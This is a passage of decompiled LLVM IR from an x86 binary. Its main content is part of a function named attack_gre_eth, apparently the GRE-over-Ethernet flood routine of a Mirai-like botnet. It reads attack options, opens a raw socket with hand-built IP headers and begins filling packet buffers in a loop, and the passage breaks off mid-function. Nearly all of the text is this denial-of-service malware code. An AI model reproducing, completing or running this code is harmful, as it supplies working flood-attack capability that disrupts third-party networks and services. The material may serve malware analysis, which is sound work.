  uselistorder i8* %v1_8048f9a, { 41, 21, 20, 25, 31, 30, 29, 28, 27, 26, 5, 4, 3, 2, 1, 0, 35, 24, 23, 22, 33, 32, 19, 18, 17, 16, 80, 44, 43, 42, 34, 15, 39, 38, 37, 40, 36, 48, 47, 46, 45, 14, 50, 49, 13, 53, 52, 51, 12, 56, 55, 54, 11, 10, 9, 6, 8, 7, 79, 77, 78, 81, 82, 73, 74, 69, 70, 71, 72, 75, 76, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %v1_8048c1f, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-20888.0, { 47, 22, 23, 24, 25, 50, 46, 48, 49, 51, 41, 43, 44, 45, 52, 17, 42, 37, 38, 39, 40, 53, 35, 36, 54, 32, 33, 34, 55, 29, 30, 31, 56, 57, 58, 59, 60, 62, 18, 19, 20, 21, 26, 27, 28, 61, 4, 2, 3, 5, 6, 7, 10, 11, 13, 14, 15, 16, 63, 12, 0, 1, 8, 9, 64 }
  uselistorder i32 %v2_8048bcc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8048bc0, { 6, 1, 5, 0, 7, 2, 8, 3, 4, 9 }
  uselistorder i8 %tmp177, { 1, 0 }
  uselistorder i32 %v1_8048b3e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8048b1f, { 1, 2, 3, 4, 0 }
  uselistorder i1 %v12_8048b09, { 1, 0 }
  uselistorder i32 %v0_8048b06, { 2, 1, 0, 3 }
  uselistorder i32* %v2_804a639, { 2, 3, 1, 0 }
  uselistorder i8 %v1_804a62e, { 5, 4, 6, 7, 3, 2, 1, 0 }
  uselistorder i8* %v2_804a56c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_8048ab7, { 1, 0 }
  uselistorder i32 %v3_8048a9f, { 69, 80, 78, 79, 77, 44, 45, 46, 47, 72, 48, 49, 86, 81, 82, 76, 83, 84, 85, 87, 14, 67, 68, 73, 74, 75, 88, 37, 70, 71, 63, 62, 64, 65, 66, 89, 59, 60, 61, 90, 56, 57, 58, 91, 53, 54, 55, 92, 93, 94, 95, 96, 97, 39, 38, 40, 41, 42, 50, 51, 43, 52, 13, 12, 15, 10, 8, 9, 11, 2, 3, 4, 5, 6, 7, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 98, 22, 0, 99, 1, 100, 101 }
  uselistorder i32 %.v0_80489fd, { 5, 3, 4, 0, 1, 2 }
  uselistorder i32 %v2_80489c5, { 1, 0, 2 }
  uselistorder i32 %v4_80489c0, { 1, 2, 0 }
  uselistorder i32 %v1_80489f3, { 2, 3, 1, 0 }
  uselistorder i8* %v3_80489c0.pre, { 1, 2, 0 }
  uselistorder i8 %v1_80489e3, { 1, 0 }
  uselistorder i32 %v1_80489ad, { 1, 0 }
  uselistorder i32 %v2_80489a5, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v1_8048998, { 1, 0 }
  uselistorder i32 %v2_8048990, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_804896e, { 1, 2, 0, 3 }
  uselistorder i1 %v9_8048966, { 1, 0, 2, 3, 4 }
  uselistorder i8* %tmp170, { 0, 2, 1 }
  uselistorder i32 %v6_8048913, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v5_8048901, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v6_80488ef, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v5_80488dd, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v4_80488ba, { 2, 0, 1 }
  uselistorder i32 %v15_80488b4, { 1, 0 }
  uselistorder i32 %v0_80488b3, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 %v0_80488b2, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32* %stack_var_-20940, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i8** %stack_var_-20848, { 2, 0, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 22, 25, 26, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 27, 28, 29, 30, 31, 32, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 57, 55, 58, 59, 71, 72, 73, 282, 283, 284, 285, 286, 287, 288, 289, 290, 292, 293, 291, 9, 11, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 148, 139, 140, 141, 142, 143, 144, 145, 146, 147, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 186, 188, 187, 182, 183, 184, 185, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 209, 210, 201, 202, 203, 204, 205, 206, 207, 208, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 233, 234, 231, 232, 10, 8, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 15, 16, 12, 13, 2, 3, 14, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 136, 16, 17, 18, 19, 20, 21, 22, 129, 130, 131, 132, 133, 134, 135, 137, 138, 139, 140, 25, 123, 26, 124, 23, 24, 125, 126, 127, 128, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 109, 110, 111, 107, 108, 112, 113, 114, 115, 116, 117, 119, 118, 122, 120, 121 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 89, 90, 91, 92, 15, 87, 14, 88, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 80, 78, 79, 81, 82, 83, 84, 85, 86 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 26, 27, 24, 25, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %ebp.global-to-local, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 309, 19, 20, 21, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 22, 23, 24, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 61, 62, 63, 64, 65, 66, 67, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 413, 412, 353, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 68, 361, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 354, 355, 356, 357, 358, 359, 360, 362, 363, 364, 365, 80, 366, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 367, 393, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 380, 379, 381, 382, 383, 384, 385, 386, 389, 390, 391, 392, 394, 395, 396, 79, 81, 82, 83, 387, 388, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 125, 126, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 161, 152, 153, 169, 164, 154, 155, 156, 157, 158, 159, 160, 162, 163, 165, 166, 167, 170, 168, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 278, 281, 279, 280, 277, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 304, 305, 303, 306, 307, 308, 310, 311, 312, 313, 314, 315, 316, 317, 318, 324, 319, 320, 321, 322, 323, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 341, 342, 339, 340, 352, 351, 343, 344, 345, 346, 347, 348, 349, 350 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 ()* @util_strcmp, { 2, 0, 1 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 20612, { 1, 2, 3, 0 }
  uselistorder i32 20900, { 3, 4, 5, 6, 7, 0, 8, 9, 10, 11, 1, 12, 13, 2, 14, 15 }
  uselistorder i32 20916, { 0, 15, 1, 2, 10, 16, 6, 17, 11, 3, 12, 4, 7, 8, 14, 5, 13, 9, 18, 19, 20, 21 }
  uselistorder i32 533, { 0, 2, 1, 3 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8055854.12 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_804a55a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_804a46c, { 1, 0 }
  uselistorder label %dec_label_pc_804a3c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a249, { 1, 0 }
  uselistorder label %dec_label_pc_804a221, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a149, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a111, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a0f3, { 1, 0 }
  uselistorder label %dec_label_pc_804a0d3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a0c2, { 1, 0 }
  uselistorder label %dec_label_pc_804a04d, { 1, 0 }
  uselistorder label %dec_label_pc_8049fe7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e64, { 1, 0 }
  uselistorder label %dec_label_pc_8049d67, { 4, 5, 6, 7, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8049d01, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049c46, { 1, 0 }
  uselistorder label %dec_label_pc_8049c3d, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049c20, { 1, 0 }
  uselistorder label %dec_label_pc_8049beb, { 1, 0 }
  uselistorder label %dec_label_pc_8049bba, { 1, 0 }
  uselistorder label %dec_label_pc_8049b77, { 1, 0 }
  uselistorder label %dec_label_pc_8049b09, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049ae7, { 1, 0 }
  uselistorder label %dec_label_pc_8049a57, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049a17, { 1, 0 }
  uselistorder label %dec_label_pc_8049980, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049940, { 1, 0 }
  uselistorder label %dec_label_pc_80498a9, { 1, 0 }
  uselistorder label %dec_label_pc_804987c, { 1, 0 }
  uselistorder label %dec_label_pc_804982e, { 1, 0 }
  uselistorder label %dec_label_pc_8049753, { 1, 0 }
  uselistorder label %dec_label_pc_804962b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804960a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80495fc, { 1, 0 }
  uselistorder label %dec_label_pc_8049598, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049520, { 0, 4, 3, 1, 5, 2 }
  uselistorder label %dec_label_pc_8049480, { 1, 0 }
  uselistorder label %dec_label_pc_8049462, { 1, 0 }
  uselistorder label %dec_label_pc_8049406, { 1, 0 }
  uselistorder label %dec_label_pc_8049320, { 1, 0 }
  uselistorder label %dec_label_pc_8048f42, { 1, 0 }
  uselistorder label %dec_label_pc_8048e80, { 11, 12, 13, 1, 7, 9, 6, 10, 3, 0, 8, 5, 2, 4 }
  uselistorder label %dec_label_pc_8048e50, { 1, 0 }
  uselistorder label %dec_label_pc_8048d05, { 1, 0 }
  uselistorder label %dec_label_pc_8048cc5, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca2, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_8048c88, { 1, 0 }
  uselistorder label %dec_label_pc_8048c1a, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_8048baa, { 1, 0 }
  uselistorder label %bb119, { 1, 0 }
  uselistorder label %dec_label_pc_8048b3e, { 1, 0 }
  uselistorder label %dec_label_pc_80489ec, { 1, 0 }
  uselistorder label %dec_label_pc_80489d8, { 1, 0 }
  uselistorder label %dec_label_pc_804897d, { 1, 2, 0, 3, 4 }
}

define i32 @attack_gre_eth(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_804a6a3 = load i32, i32* @ebx, align 4
  %v4_804a6a9 = zext i8 %arg2 to i32
  %v5_804a6a9 = load i32, i32* @eax, align 4
  %v6_804a6a9 = and i32 %v5_804a6a9, -256
  %v7_804a6a9 = or i32 %v6_804a6a9, %v4_804a6a9
  store i32 %v7_804a6a9, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @esi, align 4
  store i32 %v4_804a6a9, i32* %edx.global-to-local, align 4
  %v4_804a6b9 = urem i32 %arg4, 256
  store i32 0, i32* %stack_var_-20, align 4
  store i32 %v4_804a6b9, i32* @ebx, align 4
  %v2_804a6d9 = zext i8 %arg2 to i64
  %v3_804a6d9 = call i32 @calloc(i64 %v2_804a6d9, i32 4)
  store i32 %v3_804a6d9, i32* @eax, align 4
  %v0_804a6e6 = load i32, i32* @esi, align 4
  %v0_804a6e7 = load i32, i32* @ebx, align 4
  %v4_804a6e8 = trunc i32 %v0_804a6e7 to i8
  %v5_804a6e8 = call i32 @attack_get_opt_int(i8 %v4_804a6e8, i32 %v0_804a6e6, i32 2, i32 0)
  %v6_804a6e8 = trunc i32 %v5_804a6e8 to i8
  store i32 %v5_804a6e8, i32* @eax, align 4
  %v12_804a6f1 = ptrtoint i32* %stack_var_-124 to i32
  %v0_804a6fb = load i32, i32* @esi, align 4
  %v0_804a6fc = load i32, i32* @ebx, align 4
  %v4_804a6fd = trunc i32 %v0_804a6fc to i8
  %v5_804a6fd = call i32 @attack_get_opt_int(i8 %v4_804a6fd, i32 %v0_804a6fb, i32 3, i32 65535)
  store i32 %v5_804a6fd, i32* @eax, align 4
  %v0_804a70a = load i32, i32* @esi, align 4
  %v0_804a70b = load i32, i32* @ebx, align 4
  %v4_804a70c = trunc i32 %v0_804a70b to i8
  %v5_804a70c = call i32 @attack_get_opt_int(i8 %v4_804a70c, i32 %v0_804a70a, i32 4, i32 64)
  %v6_804a70c = trunc i32 %v5_804a70c to i8
  store i32 %v5_804a70c, i32* @eax, align 4
  %v0_804a71c = load i32, i32* @esi, align 4
  %v0_804a71d = load i32, i32* @ebx, align 4
  %v4_804a71e = trunc i32 %v0_804a71d to i8
  %v5_804a71e = call i32 @attack_get_opt_int(i8 %v4_804a71e, i32 %v0_804a71c, i32 5, i32 1)
  %v6_804a71e = trunc i32 %v5_804a71e to i8
  store i32 %v5_804a71e, i32* @eax, align 4
  %v0_804a72e = load i32, i32* @esi, align 4
  %v0_804a72f = load i32, i32* @ebx, align 4
  %v4_804a730 = trunc i32 %v0_804a72f to i8
  %v5_804a730 = call i32 @attack_get_opt_int(i8 %v4_804a730, i32 %v0_804a72e, i32 6, i32 65535)
  store i32 %v5_804a730, i32* @eax, align 4
  %v0_804a743 = load i32, i32* @esi, align 4
  %v0_804a744 = load i32, i32* @ebx, align 4
  %v4_804a745 = trunc i32 %v0_804a744 to i8
  %v5_804a745 = call i32 @attack_get_opt_int(i8 %v4_804a745, i32 %v0_804a743, i32 7, i32 65535)
  store i32 %v5_804a745, i32* @eax, align 4
  %sext = mul i32 %v5_804a745, 65536
  %v1_804a74f = sdiv i32 %sext, 65536
  store i32 %v1_804a74f, i32* @ebp, align 4
  %v0_804a753 = load i32, i32* @esi, align 4
  %v0_804a754 = load i32, i32* @ebx, align 4
  %v4_804a755 = trunc i32 %v0_804a754 to i8
  %v5_804a755 = call i32 @attack_get_opt_int(i8 %v4_804a755, i32 %v0_804a753, i32 0, i32 512)
  store i32 %v5_804a755, i32* @eax, align 4
  %v0_804a765 = load i32, i32* @esi, align 4
  %v0_804a766 = load i32, i32* @ebx, align 4
  %v4_804a767 = trunc i32 %v0_804a766 to i8
  %v5_804a767 = call i32 @attack_get_opt_int(i8 %v4_804a767, i32 %v0_804a765, i32 1, i32 1)
  store i32 %v5_804a767, i32* @eax, align 4
  %v0_804a774 = load i32, i32* @esi, align 4
  %v0_804a775 = load i32, i32* @ebx, align 4
  %v4_804a776 = trunc i32 %v0_804a775 to i8
  %v5_804a776 = call i32 @attack_get_opt_int(i8 %v4_804a776, i32 %v0_804a774, i32 18, i32 0)
  store i32 %v5_804a776, i32* @eax, align 4
  %v0_804a77e = load i32, i32* @global_var_805a858.27, align 8
  store i32 %v0_804a77e, i32* %ecx.global-to-local, align 4
  %sext3 = mul i32 %v5_804a776, 16777216
  %v1_804a784 = sdiv i32 %sext3, 16777216
  store i32 %v1_804a784, i32* @edi, align 4
  %v0_804a789 = load i32, i32* @esi, align 4
  %v0_804a78a = load i32, i32* @ebx, align 4
  %v4_804a78b = trunc i32 %v0_804a78a to i8
  %v5_804a78b = call i32 @attack_get_opt_int(i8 %v4_804a78b, i32 %v0_804a789, i32 24, i32 %v0_804a77e)
  store i32 %v5_804a78b, i32* %eax.global-to-local, align 4
  %v2_804a79b = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_804a7a7 = add i32 %v2_804a79b, %arg1
  store i32 %v2_804a7a7, i32* %eax.global-to-local, align 4
  %v3_804a7b6 = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_804a7c2 = add i32 %v3_804a7b6, 1
  %v8_804a7c2 = icmp eq i32 %v1_804a7c2, 0
  store i32 %v1_804a7c2, i32* %eax.global-to-local, align 4
  br i1 %v8_804a7c2, label %dec_label_pc_804a98e, label %dec_label_pc_804a7c9

dec_label_pc_804a7c9:                             ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v2_804a7d6 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v3_804a7b6, i32* %eax.global-to-local, align 4
  %v5_804a7e4 = call i32 @__GI_setsockopt(i32 %v3_804a7b6, i32 0, i32 3, i32 %v2_804a7d6, i32 4)
  %v1_804a7ec = add i32 %v5_804a7e4, 1
  %v8_804a7ec = icmp eq i32 %v1_804a7ec, 0
  store i32 %v1_804a7ec, i32* %eax.global-to-local, align 4
  br i1 %v8_804a7ec, label %dec_label_pc_804a97e, label %dec_label_pc_804a7f3

dec_label_pc_804a7f3:                             ; preds = %dec_label_pc_804a7c9
  %sext4 = mul i32 %v5_804a6fd, 65536
  %v4_804a7f3 = sdiv i32 %sext4, 65536
  %sext5 = mul i32 %v5_804a730, 65536
  %v4_804a7f7 = sdiv i32 %sext5, 65536
  store i32 %v4_804a7f7, i32* %edx.global-to-local, align 4
  %v0_804a800 = load i32, i32* @edi, align 4
  store i32 %v0_804a800, i32* %eax.global-to-local, align 4
  %v0_804a807 = load i32, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v4_804a818 = icmp eq i8 %arg2, 0
  br i1 %v4_804a818, label %dec_label_pc_804a7f3.dec_label_pc_804a996_crit_edge, label %dec_label_pc_804a823

dec_label_pc_804a7f3.dec_label_pc_804a996_crit_edge: ; preds = %dec_label_pc_804a7f3
  %.pre = add i32 %v5_804a755, 8
  br label %dec_label_pc_804a996

dec_label_pc_804a823:                             ; preds = %dec_label_pc_804a7f3
  %v1_804a80c = trunc i32 %v0_804a800 to i8
  %v1_804a807 = trunc i32 %v0_804a807 to i16
  store i32 0, i32* @ebx, align 4
  %v1_804a829 = add i32 %v5_804a755, 28
  %v1_804a82c = add i32 %v5_804a755, 66
  %v1_804a82f = trunc i32 %v1_804a829 to i16
  %v1_804a838 = add i32 %v5_804a755, 8
  %v1_804a83b = sub nsw i32 -1, %v4_804a7f3
  store i32 %v1_804a83b, i32* %edx.global-to-local, align 4
  %v1_804a83e = trunc i32 %v1_804a838 to i16
  %v1_804a843 = trunc i32 %v1_804a83b to i16
  %v1_804a84c = trunc i32 %v1_804a82c to i16
  %v2_804a84c = call i16 @llvm.bswap.i16(i16 %v1_804a84c)
  %v3_804a84c = zext i16 %v2_804a84c to i32
  %v5_804a84c = and i32 %v1_804a82c, -65536
  %v6_804a84c = or i32 %v3_804a84c, %v5_804a84c
  store i32 %v6_804a84c, i32* @ebp, align 4
  %v1_804a850 = trunc i32 %v4_804a7f3 to i16
  %v2_804a850 = call i16 @llvm.bswap.i16(i16 %v1_804a850)
  %v3_804a850 = zext i16 %v2_804a850 to i32
  %v5_804a850 = and i32 %v4_804a7f3, -65536
  %v6_804a850 = or i32 %v3_804a850, %v5_804a850
  store i32 %v6_804a850, i32* %eax.global-to-local, align 4
  %v4_804a8c2 = urem i32 %v5_804a6e8, 256
  %v4_804a8dc = urem i32 %v5_804a70c, 256
  %v4_804a8e6 = icmp eq i8 %v6_804a71e, 0
  %v3_804a90e = add i32 %arg3, 16
  %v2_804a92f = call i16 @llvm.bswap.i16(i16 %v1_804a82f)
  %v2_804a93b = call i16 @llvm.bswap.i16(i16 %v1_804a843)
  %v3_804a93b = zext i16 %v2_804a93b to i32
  %v5_804a93b = and i32 %v1_804a83b, -65536
  %v6_804a93b = or i32 %v3_804a93b, %v5_804a93b
  %v4_804a960 = icmp eq i8 %v1_804a80c, 0
  %v1_804a86a = trunc i32 %v4_804a7f7 to i16
  %v2_804a86a = call i16 @llvm.bswap.i16(i16 %v1_804a86a)
  %v3_804a86a = zext i16 %v2_804a86a to i32
  %v5_804a86a = and i32 %v4_804a7f7, -65536
  %v6_804a86a = or i32 %v3_804a86a, %v5_804a86a
  %v2_804a87a = call i16 @llvm.bswap.i16(i16 %v1_804a807)
  %v3_804a87a = zext i16 %v2_804a87a to i32
  %v2_804a887 = call i16 @llvm.bswap.i16(i16 %v1_804a83e)
  %v3_804a887 = zext i16 %v2_804a887 to i32
  %v1_804a968 = icmp eq i1 %v4_804a960, false
  br label %dec_label_pc_804a899

dec_label_pc_804a85b:                             ; preds = %dec_label_pc_804a957
  %v0_804a85b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a85b = add i32 %v0_804a85b, 16
  %v2_804a85b = inttoptr i32 %v1_804a85b to i32*
  %v3_804a85b = load i32, i32* %v2_804a85b, align 4
  store i32 %v3_804a85b, i32* %eax.global-to-local, align 4
  %v1_804a85e = load i32, i32* @esi, align 4
  %v2_804a85e = add i32 %v1_804a85e, 16
  %v3_804a85e = inttoptr i32 %v2_804a85e to i32*
  store i32 %v3_804a85b, i32* %v3_804a85e, align 4
  br label %dec_label_pc_804a861

dec_label_pc_804a861:                             ; preds = %dec_label_pc_804a96e, %dec_label_pc_804a85b
  %v3_804a861 = load i32, i32* %stack_var_-20, align 4
  %v1_804a869 = add i32 %v3_804a861, 1
  store i32 %v1_804a869, i32* @ebx, align 4
  store i32 %v6_804a86a, i32* %eax.global-to-local, align 4
  store i32 %v1_804a869, i32* %stack_var_-20, align 4
  %v2_804a872 = load i32, i32* @edi, align 4
  %v3_804a872 = inttoptr i32 %v2_804a872 to i16*
  store i16 %v2_804a86a, i16* %v3_804a872, align 2
  %v5_804a875 = load i32, i32* %eax.global-to-local, align 4
  %v5_804a87a = and i32 %v5_804a875, -65536
  %v6_804a87a = or i32 %v5_804a87a, %v3_804a87a
  store i32 %v6_804a87a, i32* %eax.global-to-local, align 4
  %v2_804a87e = load i32, i32* @edi, align 4
  %v3_804a87e = add i32 %v2_804a87e, 2
  %v4_804a87e = inttoptr i32 %v3_804a87e to i16*
  store i16 %v2_804a87a, i16* %v4_804a87e, align 2
  %v5_804a882 = load i32, i32* %eax.global-to-local, align 4
  %v5_804a887 = and i32 %v5_804a882, -65536
  %v6_804a887 = or i32 %v5_804a887, %v3_804a887
  store i32 %v6_804a887, i32* %eax.global-to-local, align 4
  %v0_804a88b = load i32, i32* @ebx, align 4
  %v2_804a88f = load i32, i32* @edi, align 4
  %v3_804a88f = add i32 %v2_804a88f, 4
  %v4_804a88f = inttoptr i32 %v3_804a88f to i16*
  store i16 %v2_804a887, i16* %v4_804a88f, align 2
  %v5_804a893 = icmp slt i32 %v0_804a88b, %v4_804a6a9
  br i1 %v5_804a893, label %dec_label_pc_804a899, label %dec_label_pc_804a996.loopexit

dec_label_pc_804a899:                             ; preds = %dec_label_pc_804a861, %dec_label_pc_804a823
  %v3_804a8a2 = call i32 @calloc(i64 1510, i32 4)
  store i32 %v3_804a6d9, i32* %edx.global-to-local, align 4
  %v2_804a8ab = load i32, i32* @ebx, align 4
  %v3_804a8ab = mul i32 %v2_804a8ab, 4
  %v4_804a8ab = add i32 %v3_804a8ab, %v3_804a6d9
  %v5_804a8ab = inttoptr i32 %v4_804a8ab to i32*
  store i32 %v3_804a8a2, i32* %v5_804a8ab, align 4
  %v3_804a8ae = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a8ae, i32* %eax.global-to-local, align 4
  %v0_804a8b2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a8b2 = mul i32 %v3_804a8ae, 4
  %v3_804a8b2 = add i32 %v0_804a8b2, %v2_804a8b2
  %v4_804a8b2 = inttoptr i32 %v3_804a8b2 to i32*
  %v5_804a8b2 = load i32, i32* %v4_804a8b2, align 4
  store i32 %v5_804a8b2, i32* %ebx.global-to-local, align 4
  %v1_804a8b5 = add i32 %v5_804a8b2, 24
  store i32 %v1_804a8b5, i32* %edx.global-to-local, align 4
  %v1_804a8b8 = add i32 %v5_804a8b2, 20
  store i32 %v1_804a8b8, i32* %ecx.global-to-local, align 4
  %v1_804a8bf = inttoptr i32 %v5_804a8b2 to i8*
  store i8 69, i8* %v1_804a8bf, align 1
  %v5_804a8c2 = load i32, i32* %edx.global-to-local, align 4
  %v6_804a8c2 = and i32 %v5_804a8c2, -256
  %v7_804a8c2 = or i32 %v6_804a8c2, %v4_804a8c2
  store i32 %v7_804a8c2, i32* %edx.global-to-local, align 4
  %v0_804a8c6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804a8c6 = add i32 %v0_804a8c6, 38
  store i32 %v1_804a8c6, i32* @esi, align 4
  %v3_804a8c9 = add i32 %v0_804a8c6, 1
  %v4_804a8c9 = inttoptr i32 %v3_804a8c9 to i8*
  store i8 %v6_804a6e8, i8* %v4_804a8c9, align 1
  %v0_804a8cc = load i32, i32* %ebx.global-to-local, align 4
